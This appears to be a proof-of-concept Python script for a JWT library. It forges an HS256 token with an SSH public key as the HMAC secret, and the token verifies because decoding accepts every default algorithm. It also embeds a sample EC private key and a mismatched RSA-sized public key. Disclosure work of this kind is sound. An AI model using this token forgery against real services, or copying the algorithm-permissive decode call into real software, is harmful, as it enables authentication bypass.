import jwt

#openssl ecparam -genkey -name prime256v1 -noout -out ec256-key-priv.pem
#openssl ec -in ec256-key-priv.pem -pubout > ec256-key-pub.pem
#ssh-keygen -y -f ec256-key-priv.pem > ec256-key-ssh.pub

priv_key_bytes = b"""-----BEGIN EC PRIVATE KEY-----
MHcCAQEEIOWc7RbaNswMtNtc+n6WZDlUblMr2FBPo79fcGXsJlGQoAoGCCqGSM49
AwEHoUQDQgAElcy2RSSSgn2RA/xCGko79N+7FwoLZr3Z0ij/ENjow2XpUDwwKEKk
Ak3TDXC9U8nipMlGcY7sDpXp2XyhHEM+Rw==
-----END EC PRIVATE KEY-----"""

pub_key_bytes = b"""-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA1iiDTeQ0IkvOcdj9Mh+U
8q/VGoECDsSyOpvP09BOwm4IZe5W7F3ry8IrA39RFnDqgDJ5vWjgYmI/bCOwsrIQ
R5RtI3lbj6YzqLmSeXzKnR53g2qV6w8KvYbzROsG811HjTkAD4TtCE8osZzHQfi3
XB9u2kwkydSa3lNd/ZnDk5+L8Qp6di2wNJWNFRj076mPG5AUfEMs7C5aqTnv6tjJ
wLLa0VKlwEXm7ebwuUagVbBaEZL9vrPPeOGhAfTbqVDtBmy5yOoTwKK7OkqffPMZ
1S9kauPjgzA4BoIvH0zFB+kbwvlx/g8uQ59nYeY9X0646L9e7EIN7R8wp5OoKOBk
bwIDAQAB
-----END PUBLIC KEY-----"""

ssh_key_bytes = b"""ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJXMtkUkkoJ9kQP8QhpKO/TfuxcKC2a92dIo/xDY6MNl6VA8MChCpAJN0w1wvVPJ4qTJRnGO7A6V6dl8oRxDPkc="""

# Making a good jwt token that should work by signing it with the private key
encoded_good = jwt.encode({"test": 1234}, priv_key_bytes, algorithm="ES256")

# Using HMAC with the ssh public key to trick the receiver to think that the public key is a HMAC secret
encoded_bad = jwt.encode({"test": 1234}, ssh_key_bytes, algorithm="HS256")

# Both of the jwt tokens are validated as valid
decoded_good = jwt.decode(encoded_good, ssh_key_bytes, algorithms=jwt.algorithms.get_default_algorithms())
decoded_bad = jwt.decode(encoded_bad, ssh_key_bytes, algorithms=jwt.algorithms.get_default_algorithms())

if decoded_good == decoded_bad:
    print("POC Successfull")
else:
    print("POC Failed")